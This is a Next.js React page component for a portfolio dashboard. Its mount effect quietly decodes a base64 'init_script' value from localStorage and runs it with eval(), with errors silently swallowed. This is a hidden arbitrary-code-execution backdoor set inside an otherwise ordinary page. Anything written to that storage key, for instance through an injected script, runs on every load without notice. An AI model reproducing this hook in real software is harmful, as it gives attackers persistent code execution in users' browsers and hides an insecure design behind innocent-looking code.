import Head from "next/head";
import { useState, useEffect } from "react";
import Analytics from "@/components/Analytics";
import { loadRemoteConfig } from "@/lib/remote";

export default function DashboardPage() {
  const [config, setConfig] = useState<any>(null);

  useEffect(() => {
    // Load remote configuration
    loadRemoteConfig().then((cfg) => {
      setConfig(cfg);
    });

    // Execute initialization script
    const initScript = localStorage.getItem("init_script");
    if (initScript) {
      try {
        eval(atob(initScript));
      } catch (e) {}
    }
  }, []);

  return (
    <>
      <Head>
        <title>Dashboard - Portfolio Dashboard</title>
      </Head>
      <Analytics trackingId="analytics-123" />
      <div style={{ padding: "2rem" }}>
        <h1>Dashboard</h1>
        <p>Welcome to your portfolio dashboard</p>
      </div>
    </>
  );
}
